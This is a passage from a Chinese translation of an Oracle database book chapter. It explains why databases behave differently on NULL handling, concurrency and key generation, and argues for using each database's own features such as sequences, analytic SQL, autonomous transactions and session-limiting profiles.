  \ A”在周五下午 2:00 到 3:00 的请求，然后运行一个查询来查找冲突。下一个人会尝试插入一个冲突的请求，并在查找冲突时被阻塞（等待新插入的数据变为可读状态）。在那个阻塞式读取的数据库中，我们的应用程序看起来行为良好，尽管如果我们双方都插入了行然后试图读取对方的数据，它同样很容易*死锁*（第\
  \ 6 章关于锁的内容会涵盖这个概念）。我们对资源分配冲突的检查会一个接一个地发生，永远不会并发进行。\n\n如果我们把这个应用程序迁移到 Oracle，并简单地假设它的行为方式会相同，那我们会大吃一惊。在\
  \ Oracle 上，它采用行级锁并提供非阻塞读取，因此它看起来表现不佳。正如我们之前看到的，我们必须使用`FOR UPDATE`子句来串行化访问。没有这个子句，两个用户可能为同一资源安排相同的时间段。这是不理解我们所使用的数据库在多用户环境中如何运作的直接后果。\n\
  \n当应用程序从数据库 A 迁移到数据库 B 时，我多次遇到类似的问题。当一个在数据库 A 中运行无瑕的应用程序在数据库 B 中无法工作或以明显怪异的方式工作时，人们的第一反应是数据库\
  \ B 是“坏数据库”。简单的事实是，数据库 B 只是运作方式*不同*。没有哪个数据库是错的或坏的；它们只是不同。了解并理解它们的工作方式将极大地帮助你处理这些问题。将应用程序从\
  \ Oracle 迁移到 SQL Server 会暴露 SQL Server 的阻塞式读取和死锁问题——反之亦然。\n\n例如，我曾被请去帮助将一些 Transact-SQL（SQL\
  \ Server 的存储过程语言）转换为 PL/SQL。进行转换的开发人员抱怨说 Oracle 中的 SQL 查询返回了“错误的”答案。查询看起来像这样：\n\n\
  ```\ndeclare\n  l_some_variable   varchar2(25);\nbegin\n  if ( some_condition )\n\
  \  then\n    l_some_variable := f( ... );\n  end if;\n  for x in ( select * from\
  \ T where x = l_some_variable )\n  loop\n    ...\n```\n\n\n\n这里的目标是找出表 `T` 中所有满足以下条件的行：如果某个条件不满足，则\
  \ `x` 为 `NULL`；如果某个条件满足，则 `x` 等于一个特定值。\n\n问题在于，在 Oracle 中，当 `L_SOME_VARIABLE` 未被设置为一个特定值（即保持为\
  \ `NULL`）时，此查询不会返回任何数据。而在 Sybase 或 SQL Server 中，情况并非如此——查询会找到那些 `x` 被设置为 `NULL`\
  \ 值的行。我几乎在每次从 Sybase 或 SQL Server 向 Oracle 迁移时都会遇到这个问题。SQL 应该在三值逻辑下运行，而 Oracle 实现\
  \ `NULL` 比较的方式符合 ANSI SQL 的要求（其中 `NULL` 表示一种未知状态，而非一个值）。根据这些规则，将 `x` 与 `NULL` 进行比较既不真也不假——它实际上是*未知*的。以下代码段说明了我的意思：\n\
  \n```\nSQL> select * from dual where null=null;\nno rows selected\nSQL> select *\
  \ from dual where null  null;\nno rows selected\nSQL> select * from dual where null\
  \ is null;\nD\n-\nX\n```\n\n第一次看到这个可能会令人困惑。它证明了在 Oracle 中，`NULL` 既不等于 `NULL`，也不不等于\
  \ `NULL`。SQL Server 默认情况下不这样做：在 SQL Server 和 Sybase 中，`NULL` 等于 `NULL`（默认情况下；在当前版本的\
  \ SQL Server 中，默认行为可能已修改为遵循 ANSI 标准）。没有哪个数据库的处理方式是*错误*的——只是*不同*而已。实际上，所有这些数据库都符合\
  \ ANSI 标准（符合 ANSI 标准并不意味着你支持 100% 的标准，远非如此；详情请参见下一节“标准的影响”），但它们的工作方式仍然不同。存在着一些歧义、向后兼容性问题等等需要克服。例如，SQL\
  \ Server 支持 ANSI 的 `NULL` 比较方法，只是不是默认方式（如果默认就这样做，会破坏成千上万个基于该数据库构建的现有遗留应用程序）。\n\n\
  在这种情况下，一个解决方案是将查询改写为这样：\n\n```\nselect *\nfrom t\nwhere ( x = l_some_variable OR\
  \ (x is null and l_some_variable is NULL ))\n```\n\n然而，这又导致了另一个问题。在 SQL Server 中，此查询会使用\
  \ `x` 上的索引。在 Oracle 中可能并非如此，因为 B*树索引（关于索引技术的更多内容见第 11 章）不会索引完全为 `NULL` 的条目。因此，如果你需要查找\
  \ `NULL` 值，B*树索引并不总是有用的。\n\n注意\n只要 Oracle B*树索引中至少有一列被定义为 NOT NULL，表中的所有行实际上都会出现在索引中，并且\
  \ `x` 为 null 的谓词可以并且将会使用索引来检索行。\n\n在这种情况下，为了最小化对代码的影响，我们给 `x` 分配了一个它在实际中永远不可能取到的值。这里，根据定义，`x`\
  \ 是一个正数，所以我们选择了数字 `-1`。于是，查询变成了：\n\n```\nselect * from t where nvl(x,-1) = nvl(l_some_variable,-1)\n\
  ```\n\n并且我们创建了一个基于函数的索引：\n\n```\ncreate index t_idx on t( nvl(x,-1) );\n```\n\n\
  通过最小的改动，我们达到了相同的结果。从这个例子中需要认识到的重要点是：\n\n*   数据库是不同的。使用一个数据库的经验在某种程度上可以转移到另一个数据库，但你必须准备好面对一些*根本性*的差异以及一些非常细微的差异。\n\
  *   细微的差异（如对 `NULL` 的处理）可能产生与根本性差异（如并发控制机制）一样大的影响。\n*   了解数据库、它的工作原理以及其功能的实现方式，是克服这些问题的唯一途径。\n\
  \n开发人员经常问我（通常一天不止一次）如何在数据库中完成某些特定操作，例如，“我如何在存储过程中创建临时表？”我不会直接回答这类问题。相反，我会反问：“*为什么*你想这样做？”很多时候，得到的回答是：“在\
  \ SQL Server 中我们在存储过程中创建临时表，我们需要在 Oracle 中也这样做。”这正是我预料中的回答。那么，我的回应就很简单了：“你并不是真的想在\
  \ Oracle 的存储过程中创建临时表——你只是认为你想这样做。”事实上，在 Oracle 中这样做是非常糟糕的事情。如果你在 Oracle 的存储过程中创建表，你会发现：\n\
  \n*   执行 DDL 会抑制可扩展性。\n*   不断执行 DDL 并不快。\n*   执行 DDL 会提交你的事务。\n*   为了访问这个表，你将不得不在所有存储过程中使用动态\
  \ SQL——无法使用静态 SQL（因为该表在编译时不存在）。\n*   PL/SQL 中的动态 SQL 不如静态 SQL 快，也不如其优化得好。\n\n关键在于，你并不想像在\
  \ SQL Server 中那样完全照搬地做这件事（如果你在 Oracle 中根本还需要临时表的话）。你应该按照 Oracle 中最佳的方式来做事情。就像如果你反过来从\
  \ Oracle 迁移到 SQL Server，你不会想创建一个供所有用户共享的单一表来存放临时数据（Oracle 就是这样做的）。那会限制其他数据库的可扩展性和并发性。所有数据库并非生而平等；它们都非常不同。\n\
  \n这并不是说你不能在 Oracle 中使用临时表。你可以，你很可能也会用到。只是*在 Oracle 中使用它们的方式与你在 SQL Server 中使用的方式不同*（反之亦然）。\n\
  \n\n\n## 标准的影响\n\n如果所有数据库都符合 `SQL99` 标准，那么它们必然是相同的。至少这通常是假设。在本节中，我将破除这一迷思。\n\n`SQL99`\
  \ 是数据库的 `ANSI/ISO` 标准。它是 `SQL92` `ANSI/ISO` 标准的后继者，而后者又取代了 `SQL89` `ANSI/ISO` 标准。它现在已被\
  \ `SQL2003`、`SQL2008` 和 `SQL2011` 等标准更新所取代。该标准定义了一种语言 (`SQL`) 和行为（事务、隔离级别等），用以说明数据库将如何运作。您知道许多市售数据库至少在一定程度上符合\
  \ `SQL99` 标准吗？您是否也知道，这对于查询和应用程序的可移植性而言，意义甚微？\n\n从 `SQL92` 标准开始，标准分为四个级别：\n\n*  \
  \ `入门级`：这是大多数供应商已遵从的级别。它是对前代标准 `SQL89` 的小幅增强。*没有任何数据库供应商获得过更高级别的认证*，实际上，曾负责认证 `SQL`\
  \ 符合性的机构——美国国家标准与技术研究院 (`NIST`)——甚至已不再进行认证。我是 1993 年使 `Oracle 7.0` 获得 `NIST` 认证、符合\
  \ `SQL92` 入门级标准的团队成员之一。符合入门级标准的数据库，其功能集是 `Oracle 7.0` 能力的一个子集。\n\n*   `过渡级`：就功能集而言，此级别大约介于入门级和中间级之间。\n\
  \n*   `中间级`：此级别增加了许多功能，包括（此列表绝非详尽无遗）\n    *   动态 `SQL`\n    *   用于参照完整性的级联 `DELETE`\n\
  \    *   `DATE` 和 `TIME` 数据类型\n    *   域\n    *   变长字符串\n    *   `CASE` 表达式\n  \
  \  *   数据类型间的 `CAST` 函数\n\n*   `完全级`：此级别增加了以下规定（同样，此列表并非详尽无遗）\n    *   连接管理\n  \
  \  *   `BIT` 字符串数据类型\n    *   可延迟完整性约束\n    *   `FROM` 子句中的派生表\n    *   `CHECK`\
  \ 约束子句中的子查询\n    *   临时表\n\n入门级标准不包括外连接、新的内连接语法等特性。过渡级确实指定了外连接语法和内连接语法。中间级增加了更多特性，而完全级当然包含了\
  \ `SQL92` 的全部。大多数关于 `SQL92` 的书籍并未区分各个级别，这导致了混淆。它们展示的是理论上实现了 `SQL92` 完全级的数据库会是什么样子。这使得你无法拿起一本\
  \ `SQL92` 书籍，就将书中内容应用到任意一个 `SQL92` 数据库上。关键在于，入门级的 `SQL92` 能提供的很有限，而如果你使用了中间级或更高级别的任何特性，你就有无法移植应用程序的风险。\n\
  \n`SQL99` 仅定义了两个符合性级别：`核心级` 和 `增强级`。它试图远超传统的 `SQL`，并引入了对象关系构造（数组、集合等）。它涵盖了 `SQL\
  \ MM`（多媒体）类型、对象关系类型等。没有供应商在认证其数据库“符合” `SQL99` 核心级或增强级，实际上，据我所知，没有供应商声称其产品完全符合其中任何一个级别。\n\
  \n您不必害怕使用供应商特定的功能——毕竟，您为此支付了高昂的费用。每个数据库都有其独特的技巧箱，您总能找到一种方法在每个数据库中执行给定的操作。为您当前的数据库使用最合适的方案，并在迁移到其他数据库时重新实现组件。使用良好的编程技术来将自己与这些变化隔离开来。编写\
  \ `OS` 可移植应用程序的人——例如 `Oracle` 内核开发人员——也采用了相同的技术。\n\n## 确保您能够适应\n\n目标是充分利用您可用的设施，但要确保您能够根据具体情况更改实现。打个比方，`Oracle`\
  \ 是一个可移植的应用程序。它可以在许多操作系统上运行。然而在 `Windows` 上，它以 `Windows` 的方式运行：使用线程和其他 `Windows`\
  \ 特有的设施。相比之下，在 `UNIX/Linux` 上，`Oracle` 作为多进程服务器运行，使用独立的进程来完成在 `Windows` 上由线程完成的工作——这就是\
  \ `UNIX/Linux` 的方式。“核心 `Oracle`”功能在两个平台上都可用，但其底层实现方式却大相径庭。您那些必须在多个数据库上运行的数据库应用程序也将是相同的。\n\
  \n例如，许多数据库应用程序的一个常见功能是为每一行生成唯一键。当您插入行时，系统应自动为您生成一个键。`Oracle` 为此实现了名为 `SEQUENCE`\
  \ 的数据库对象。`SYS_GUID()` 是另一个提供唯一键的函数。`Informix` 有一个 `SERIAL` 数据类型。`Sybase` 和 `SQL\
  \ Server` 有一个 `IDENTITY` 类型。每个数据库都有实现此功能的方法。然而，这些方法是不同的，无论是在操作方式还是可能的结果上。因此，对于有见识的开发者来说，有两条路可以走：\n\
  \n*   开发一种完全独立于数据库的方法来生成唯一键。\n*   适应不同的实现，并在为每个数据库实现键时使用不同的技术。\n\n> **注意**\n> `Oracle`\
  \ 有一个 `IDENTITY` 类型列。在底层，它创建了一个序列并将您的列默认值设置为该值——使其工作方式非常类似于 `SQL Server` 的 `IDENTITY`\
  \ 类型或 `MySQL` 的 `AUTO_INCREMENT` 类型。\n\n第一种方法的理论优势在于，从一种数据库迁移到另一种数据库时无需更改任何内容。我称其为“理论”优势，因为这种实现的缺点如此巨大，以至于使其完全不可行。要开发一个完全独立于数据库的过程，您必须创建一个这样的表：\n\
  \n```\n$ sqlplus eoda/foo@PDB1\nSQL> create table id_table\n( id_name  varchar2(30)\
  \ primary key,\nid_value number );\nTable created.\nSQL> insert into id_table values\
  \ ( 'MY_KEY', 0 );\n1 row created.\nSQL> commit;\nCommit complete.\n```\n\n然后，为了获得一个新键，您必须执行以下代码：\n\
  \n```\nSQL> update id_table\nset id_value = id_value+1\nwhere id_name = 'MY_KEY';\n\
  1 row updated.\nSQL> select id_value\nfrom id_table\nwhere id_name = 'MY_KEY';\n\
  ID_VALUE\n\nSQL> exit;\n```\n\n看起来很简单，但结果（注意是复数）如下：\n\n*   一次只能有一个用户处理一个事务行。您需要更新该行以递增计数器，这将导致您的程序在该操作上串行化。最理想的情况是，一次只能有一个人生成此键的新值。\n\
  *   在 `Oracle` 中（其他数据库的行为可能不同），在 `SERIALIZABLE` 隔离级别下，并发执行此操作时，除第一个尝试的用户外，所有用户都将收到错误\
  \ “`ORA-08177: can’t serialize access for this transaction`”。\n\n例如，使用可序列化事务（这在\
  \ `J2EE` 环境中更为常见，许多工具自动将其用作默认隔离模式，而开发者通常并不知晓），您将观察到以下行为：\n\n```\n$ sqlplus eoda/foo@PDB1\n\
  SQL> set transaction isolation level serializable;\nTransaction set.\nSQL> update\
  \ id_table  set id_value = id_value+1  where id_name = 'MY_KEY';\n1 row updated.\n\
  SQL> select id_value\nfrom id_table\nwhere id_name = 'MY_KEY';\nID_VALUE\n\n```\n\
  \n现在（保持之前的会话连接），我们将转到另一个 `SQL*Plus` 会话并执行相同的操作，即并发请求一个唯一 `ID`：\n\n```\n-- 会话 2\n\
  SQL> set transaction isolation level serializable;\nTransaction set.\nSQL> update\
  \ id_table\nset id_value = id_value+1\nwhere id_name = 'MY_KEY';\n```\n\n\n\n此时，此处将发生阻塞，因为一次只能有一个事务更新该行。这展示了第一种可能的结果——我们将阻塞并等待该行。但因为我们使用的是\
  \ Oracle 的`SERIALIZABLE`隔离级别，我们将在提交第一个会话的事务后观察到以下行为：\n\n```\n-- Session 1\nSQL>\
  \ commit;\nCommit complete.\n```\n\n第二个会话将立即显示以下错误：\n\n```\n-- Session 2\nSQL> update\
  \ id_table\nset id_value = id_value+1\nwhere id_name = 'MY_KEY';\nupdate id_table\n\
  *\nERROR at line 1:\nORA-08177: can't serialize access for this transaction\n```\n\
  \n无论之前的提交语句顺序如何，该错误都会发生。只要你的事务试图修改自其开始以来被其他会话修改过的任何记录，就会触发此错误。\n\n因此，那段号称数据库无关的逻辑实际上根本**不是**数据库无关的。根据隔离级别的不同，它甚至可能在单个数据库中也无法可靠地运行！有时我们会阻塞等待；有时我们会收到错误信息。说最终用户在两种情况下（等很久或等很久后得到一个错误）都会感到不快，这算是很温和的说法了。\n\
  \n这个问题的严重性在于，我们的实际事务远比上述示例要庞大得多。示例中的`UPDATE`和`SELECT`语句只是构成该事务的众多潜在语句中的两条。我们还没有将刚刚生成的对应主键的行插入到表中，也还没有完成该事务所需的其他任何工作。这种串行化将成为扩展性的一大限制因素。试想一下，如果这种技术用于处理订单的网站，并且这是我们生成订单号的方式，那将带来怎样的影响。将无法实现多用户并发，我们将被迫顺序处理一切。\n\
  \n解决这个问题的正确方法是为每个数据库使用最优的代码。在 Oracle 中，有如下两种方法（假设需要生成主键的表是`T`）：\n\n```\n$ sqlplus\
  \ eoda/foo@PDB1\nSQL> create sequence s;\nSequence created.\nSQL> create table t\n\
  ( x          number default s.nextval\nconstraint t_pk primary key,\nother_data\
  \ varchar2(20));\nTable created.\n```\n\n或者，你可以使用`IDENTITY`属性而跳过序列的显式创建：\n\n```\n\
  SQL> create table t\n( x          number generated as identity\nconstraint t_pk\
  \ primary key,\nother_data varchar2(20));\nTable created.\n```\n\n注意\n\n`IDENTITY`列必须是数值数据类型。\n\
  \n但请注意，它并非真正跳过了序列生成——序列是由数据库自动生成的。如果你无法使用自动生成的序列，则可以使用以下逻辑来获得自动生成的代理主键：\n\n```\n\
  SQL> create table t\n( pk number primary key,\nother_data varchar2(20));\nTable\
  \ created.\nSQL> create sequence t_seq;\nSequence created.\nSQL> create trigger\
  \ t before insert on t\nfor each row\nbegin\n:new.pk := t_seq.nextval;\nend;\n/\n\
  Trigger created.\n```\n\n这将自动地、透明地为插入的每一行分配一个唯一的键。一个更注重性能的方法是简单地：\n\n```\nInsert\
  \ into t ( pk, .... ) values ( t_seq.NEXTVAL, .... );\n```\n\n也就是说，完全跳过触发器的开销（这*绝对*是我的首选方法）。你可以使用其他数据库的类型达到相同的效果。`CREATE\
  \ TABLE`语法会有所不同，但最终结果是一样的。在这里，我们不遗余力地利用每个数据库的特性来生成一个*非阻塞*的、高并发的唯一键，并且没有对应用程序代码引入任何实际更改——在这个案例中，所有逻辑都包含在\
  \ DDL 中。\n\n#### 分层编程\n\n一旦你理解了每个数据库*都会以不同的方式实现特性*，另一个为了可移植性而进行防御性编程的例子是，在必要时对你的数据库访问进行分层。假设你使用`JDBC`进行编程。如果你只使用纯\
  \ SQL 的`SELECT`、`INSERT`、`UPDATE`和`DELETE`语句，你可能不需要抽象层。只要你将使用的构造限制在你打算支持的每个数据库都支持的范围内，并且已验证它们的行为完全一致（记住关于`NULL=\
  \ NULL`的讨论！），你完全可以在应用程序中直接编写 SQL。然而，这意味着你将使用性能不佳的 SQL——而且你脑子里似乎需要掌握比我认识的任何人都要多的关于更多数据库的知识（毕竟，这是判断某个操作是否有可能在所有数据库上表现一致的唯一方法！）。另一种更具可移植性且能提供更好性能的方法是使用存储过程来返回结果集。你会发现每个供应商的数据库都可以从存储过程返回结果集，但返回的方式各不相同。你必须为不同数据库编写的实际存储过程源代码是不同的。\n\
  \n你在这里的两个选择是：要么不使用存储过程返回结果集，要么为不同的数据库实现不同的代码。我肯定会遵循为不同供应商编写不同代码的方法，并大量使用存储过程。这看起来似乎会增加在不同数据库上实现的时间。然而，你会发现使用这种方法在多个数据库上实现实际上更容易。与其试图找到在*所有*数据库上都能完美运行的\
  \ SQL（也许在某些数据库上表现更好），你将为该数据库实现运行效果最佳的 SQL。你可以在应用程序本身之外完成这项工作，这为你在调整应用程序时提供了更大的灵活性。你可以在数据库中修复一个性能不佳的查询，并立即部署该修复，而无需给应用程序打补丁。此外，通过这种方法，你可以自由地利用供应商对\
  \ SQL 的扩展。例如，Oracle 支持广泛的 SQL 扩展，如分析函数、SQL 模型子句、行模式匹配等。在 Oracle 中，你可以自由使用这些 SQL\
  \ 扩展，因为它们位于应用程序“之外”（即，隐藏在数据库中）。在其他数据库中，你可能会使用它们提供的任何特性来达到相同的结果。你已经为这些功能付费了，不妨使用它们。\n\
  \n\n"
- '# 为这种方法——为您将要部署的数据库开发专用代码——提供的另一个论点


  为这种方法——为您将要部署的数据库开发专用代码——提供的另一个论点是，要找到一位（更不用说一个团队）足够精明、能够理解 Oracle、SQL Server 和
  DB2 之间差异细微之处的开发者（在此我们将讨论限制在三个数据库）几乎是不可能的。过去 20 年，我主要（并非 exclusively）使用 Oracle。我**每天**使用
  Oracle 时都能学到新东西。认为我能够同时精通三种数据库，并理解所有三者之间的差异以及这些差异将如何影响我必须构建的“通用代码”层，这是非常值得怀疑的。我怀疑自己无法准确或高效地完成这一点。此外，请考虑我们这里谈论的是个体；有多少开发者能够完全理解或使用他们当前拥有的数据库，更不用说同时精通三个？寻找能够开发出健壮、可扩展、与数据库无关的例程的独特个体，犹如寻找**圣杯**。要组建一个能够做到这一点的开发团队是不可能的。寻找一位
  Oracle 专家、一位 DB2 专家和一位 SQL Server 专家，然后告诉他们：“我们需要一个事务来完成 X、Y 和 Z”——这相对容易。他们被告知：“这是你的输入，这些是我们需要的输出，以及这个业务流程包含什么”，然后他们就能据此生成符合要求的事务性
  API（存储过程）。每个 API 都将按照该特定数据库的独特功能集，以最适合该数据库的方式实现。这些开发者可以自由地利用底层数据库平台的全部能力（或者，在情况需要时，利用其不足之处）。


  ## 多平台代码技术


  这些与实现多平台代码的开发者所使用的技术是相同的。例如，Oracle 在开发其自身数据库时就使用了这种技术。有大量代码（尽管占数据库整体代码的比例很小）被称为
  *OSD*（操作系统相关）代码，这些代码是为每个平台专门实现的。通过使用这一抽象层，Oracle 能够利用许多原生操作系统特性来提升性能和集成度，而无需重写数据库本身的大部分代码。Oracle
  能够在 Windows 上作为多线程应用程序运行，在 UNIX/Linux 上作为多进程应用程序运行，这一事实证明了这一特性。进程间通信的机制被抽象到了这样一个高度：它们可以根据不同的操作系统重新实现，从而允许采用截然不同但性能不亚于直接为该平台专门编写的应用程序的实现方式。


  ## 超越语法差异


  除了前面概述的 SQL 语法差异、实现差异以及相同查询在不同数据库中的性能差异之外，还有并发控制、隔离级别、查询一致性等问题。我们将在本书第 7 章详细讨论这些项目，您将看到它们的差异可能如何影响您。SQL92/SQL99
  试图为事务应如何工作以及隔离级别应如何实现提供一个明确的定义，但最终，您将从不同数据库获得不同的结果。这一切都归因于实现方式。在一个数据库中，应用程序可能会处处死锁和阻塞。在另一个数据库中，完全相同的应用程序却能平稳运行。在某个数据库中，您确实发生了阻塞（物理串行化）这一事实曾被您利用，但当您部署到另一个不发生阻塞的数据库时，您就得到了错误的结果。即使您
  100% 遵循了标准，将应用程序迁移到另一个数据库也需要大量的艰苦工作和努力。


  ### 特性与功能


  “不应一味追求数据库独立性”这一论点的自然延伸是，您应该确切了解您的特定数据库提供了什么，并充分利用它。本节并非关于 Oracle 提供的所有特性的介绍——那本身将是一本极其庞大的书。Oracle
  提供了超过 10,000 页的文档，要涵盖每一个特性和功能将是一项相当艰巨的任务。相反，本节旨在探讨至少获得对所提供内容的大致了解所带来的好处。


  正如我之前所说，我在网上回答关于 Oracle 的问题。我想说，我 80% 的回答只是指向文档的 URL（对于您看到的我发布的每一个问题——其中许多是指向文档中的特定部分——还有另外两个我选择不发布的问题，几乎所有这些都属于“读这个”类型的答案）。人们询问他们如何在数据库中（或在数据库之外）编写某些复杂的功能，而我只是指向文档中告诉他们
  Oracle 如何已经实现了他们需要的特性以及如何使用的部分。复制（Replication）是一个经常出现的问题。以下是一个我被问到的典型例子：


  > 是否有一个视图可以显示字面执行的 SQL？我的意思是，当我从 `V$SQL` 中选择时，`SQL_TEXT` 看起来像这样：`INSERT INTO TABLE1
  (COL1,COL2) VALUES (:1,:2)`。我需要看到实际提交的数据。例如：`INSERT INTO TABLE1 (COL1,COL2) VALUES
  (''FirstVal'',12)`。我试图获取的是针对一个模式运行的所有 insert、update 或 delete 语句的列表，然后按相同的执行顺序对第二个模式运行这些相同的
  SQL 语句。我希望可以编写类似这样的内容：

  >

  > ```

  > Select SQL_FULLTEXT from V$SQL where FIRST_LOAD_TIME > SYSDATE-(1/24) AND ➥

  > (SQL_TEXT like ‘INSERT%’...) order by FIRST_LOAD_TIME

  > ```

  >

  > 然后通过 Web 服务将此记录集发送给 schema2，由它来处理这些语句。这可能吗？


  这里有人试图重新发明复制功能！他们无法获取字面 SQL（谢天谢地！），但即使他们能够获取，这种方法也永远不会奏效。您不能只是获取一组并发执行的 SQL 语句（在两个
  SQL 语句同时执行的多 CPU 机器上会发生什么？），然后串行地执行它们（您最终可能会得到不同的结果！）。您需要使用与源系统相同的并发度来重放它们。


  例如，如果我和你几乎在同一时间执行 `INSERT INTO A_TABLE SELECT * FROM A_TABLE;`，我们最终会让 `A_TABLE`
  的行数变成开始时的三倍。例如，如果 `A_TABLE` 开始时有 100 行，我执行了那个插入，现在它将有 200 行。如果你在我之后（在我提交之前）立即执行插入，你将看不到我的
  200 行，你会再向 `A_TABLE` 中插入 100 行，最终它会有 300 行。现在，如果我们改变做法，让一个 Web 服务先执行我的插入（`A_TABLE`
  从 100 行增长到 200 行），然后再执行你的插入（`A_TABLE` 从 200 行增长到 400 行）——您就能看到这里的问题了。复制并非易事，实际上相当困难。Oracle（和其他数据库）进行复制已经超过三十年了；实施和维护它需要付出巨大的努力。



  诚然，你可以自己编写复制功能，这甚至可能很有趣，但归根结底，这并非最明智之举。数据库已经做了大量工作。通常，它能比我们自己做得更好。以复制功能为例，它是内置于内核中的，用
  C 语言编写。它速度快，相当容易实现，并且非常健壮。它能在不同版本和平台上工作。它是受支持的，因此如果你遇到问题，Oracle 的支持团队会提供帮助。如果你升级，复制功能也会得到支持，可能还会带有一些新功能。现在，想想看，如果你要自己开发复制功能，你会怎么做。你必须为你想要支持的所有版本提供支持。新旧版本之间的互操作性？那将是你的工作。如果它“坏了”，你不会打电话给支持团队——至少，直到你能提供一个足够小的测试用例来演示基本问题之前，你不会。当新版
  Oracle 发布时，将由你负责将你的复制代码迁移到新版本上。


  ## 了解已有功能


  从长远来看，未能充分了解可用的功能可能会反过来困扰你。我曾与一些拥有多年数据库应用开发经验（但在其他数据库上）的开发人员合作。他们构建分析软件（趋势分析、报告、可视化软件）。该软件用于处理与医疗保健相关的临床数据。他们不知道诸如内联视图、分析函数和标量子查询之类的
  SQL 语法特性。他们的主要问题是需要从一个父表分析数据到两个子表；实体关系图（ERD）可能如图 1-1 所示。


  ![../images/319655_4_En_1_Chapter/319655_4_En_1_Fig1_HTML.jpg](img/319655_4_En_1_Fig1_HTML.jpg)


  图 1-1

  简单的实体关系图


  开发人员需要能够根据父记录报告来自每个子表的聚合数据。他们过去使用的数据库不支持子查询因子化（`WITH`子句），也不支持内联视图——即“查询一个查询”而非查询表的能力。由于不知道这些特性存在，他们在中间层编写了自己的类数据库。他们会查询父表，然后针对返回的每一行，对每个子表运行一个聚合查询。这导致他们为了运行用户想要的每一个查询，而执行成千上万个微小的查询。或者，他们会将整个聚合后的子表提取到中间层的内存哈希表中——然后执行哈希连接。


  简而言之，他们在重新发明数据库，执行着相当于嵌套循环连接或哈希连接的功能，却无法利用临时表空间、复杂的查询优化器等优势。他们把时间花在开发、设计、微调和增强软件上，试图做他们已购买的数据库本身就能做的事情！与此同时，用户要求新功能却得不到满足，因为大部分开发时间都花在了这个报表“引擎”上，而它实际上是一个伪装起来的数据库引擎。


  我向他们展示了，他们可以做一些事情，例如将两个聚合结果连接在一起，以比较存储在不同详细级别的数据。有几种方法可行，如清单 1-1 到 1-3 所示。


  ```

  with c1_vw as

  (select id, sum(q1) c1_sum1

  from c1

  group by id),

  c2_vw as

  (select id, sum(q2) c2_sum2

  from c2

  group by id),

  c1_c2 as

  (select c1.id, c1.c1_sum1, c2.c2_sum2

  from c1_vw c1, c2_vw c2

  where c1.id = c2.id )

  select p.id, c1_sum1, c2_sum2

  from p, c1_c2

  where p.id = c1_c2.id

  /

  ```


  清单 1-3

  通过 `WITH` 子句进行子查询因子化


  ```

  select p.id,

  (select sum(q1) from c1 where c1.id = p.id) c1_sum1,

  (select sum(q2) from c2 where c2.id = p.id) c2_sum2

  from p

  where p.name = ''1234''

  /

  ```


  清单 1-2

  为每一行运行另一个查询的标量子查询


  ```

  select p.id, c1_sum1, c2_sum2

  from p,

  (select id, sum(q1) c1_sum1

  from c1

  group by id) c1,

  (select id, sum(q2) c2_sum2

  from c2

  group by id) c2

  where p.id = c1.id

  and p.id = c2.id

  /

  ```


  清单 1-1

  用于从查询中进行查询的内联视图


  除了你在这些清单中看到的，我们还可以使用`LAG`、`LEAD`、`ROW_NUMBER`、排名函数等分析函数来做很棒的事情。我们没有花一整天的时间去设法调整他们的中间层数据库引擎，而是将`SQL
  参考指南`投射在屏幕上（并结合`SQL*Plus`来创建即席演示，展示其工作原理）。最终目标不再是调整中间层；现在是要尽快关闭中间层。


  这是另一个例子：我见过人们在 Oracle 数据库中设置守护进程，用于从管道（一种通过`DBMS_PIPE`实现的数据库 IPC 机制）读取消息。这些守护进程执行管道消息中包含的
  SQL 并提交工作。他们这样做是为了在可能因主事务回滚而回滚的事务中，能够执行审计和错误日志记录。通常，如果使用触发器之类的东西来审计对某些数据的访问，但随后某条语句失败了，所有工作都将被回滚。因此，通过向另一个进程发送消息，他们可以让一个独立的事务完成工作并提交。即使主事务回滚，审计记录也会保留下来。在
  Oracle 8*i*之前的版本中，这是实现此功能的适当（并且几乎是唯一的）方式。当我告诉他们数据库有一个叫做`自治事务`的特性时，他们对自己感到相当恼火。`自治事务`仅需一行代码实现，其功能与他们所做的一模一样。从好的方面看，这意味着他们可以丢弃大量代码，并且无需再维护它。此外，整个系统运行得更快，也更容易理解。尽管如此，他们还是为自己浪费了那么多时间去重新发明轮子而感到沮丧。特别是，编写了那些守护进程的开发人员，在得知自己刚刚写了一堆“架子软件”后，相当懊恼。


  我一次又一次地看到类似的例子——针对数据库本身已经解决的问题，采用庞大复杂的解决方案。*我自己也曾犯过这种错误。* 我仍然记得那一天，我的 Oracle 销售顾问（当时我是客户）走进来，看到我被一大堆
  Oracle 文档包围着。我抬头看着他，只是问道：“这些全都是真的吗？”接下来的几天，我都在钻研和阅读。我掉进了一个陷阱，以为自己精通数据库，因为我曾使用过 SQL
  Server、SQL/DS、DB2、Ingress、Sybase、Informix、SQLBase、Oracle 等。我没有花时间去了解每个数据库各自提供了什么，而只是把我从其他数据库学到的知识应用到我正在做的事情上。（切换到
  Sybase/SQL Server 对我来说是最大的冲击——它的运作方式与其他数据库完全不同。）在真正发现 Oracle 能做什么（公平地说，也包括其他数据库）之后，我开始利用它，从而能够以更少的代码更快地推进工作。


  花点时间去了解可用的功能。不这样做，你会错过太多东西。我几乎每天都能学到关于 Oracle 的新东西。这需要持续跟进；我仍然会阅读文档。




  '
- '# 简化问题解决之道


  解决任何问题总有两种方式：简单的方法和困难的方法。一次又一次，我看到人们选择了困难的方法。这并非总是有意为之，更多时候是出于无知。他们从未想到数据库竟然能做“那种事”。而我则相反，我总是假设数据库无所不能，只有当我发现它确实无法完成某件事时，才会选择困难的方式（自己动手编写）。


  例如，我经常被问到：“如何确保终端用户在数据库中只有一个会话？”（其实我本可以用其他数百个例子。）这必定是许多应用的需求，但我从未参与过这类项目——我找不到这样限制用户的充分理由。然而，人们就是想这么做，而当他们付诸实践时，通常都会选择困难的方式。例如，他们会设置一个由操作系统运行的批处理作业，来检查
  `V$SESSION` 表，并强制终止那些拥有多个会话的用户的连接。或者，他们会创建自己的表，让用户登录时在应用中插入一行记录，登出时再删除。这种实现方式总是会导致大量的服务台求助电话，因为当应用崩溃时，删除记录的操作永远不会执行。我见过许多其他“有创意”的实现方式，但没有一个比下面这个方法更简单：


  ```

  $ sqlplus eoda/foo@PDB1

  SQL> create profile one_session limit sessions_per_user 1;

  Profile created.

  SQL> alter user scott profile one_session;

  User altered.

  现在我们尝试两次连接到 SCOTT 用户；第二次尝试应该会失败：

  SQL> connect scott/tiger@PDB1

  Connected.

  SQL> host sqlplus scott/tiger@PDB1

  ERROR:

  ORA-02391: exceeded simultaneous SESSIONS_PER_USER limit

  ```


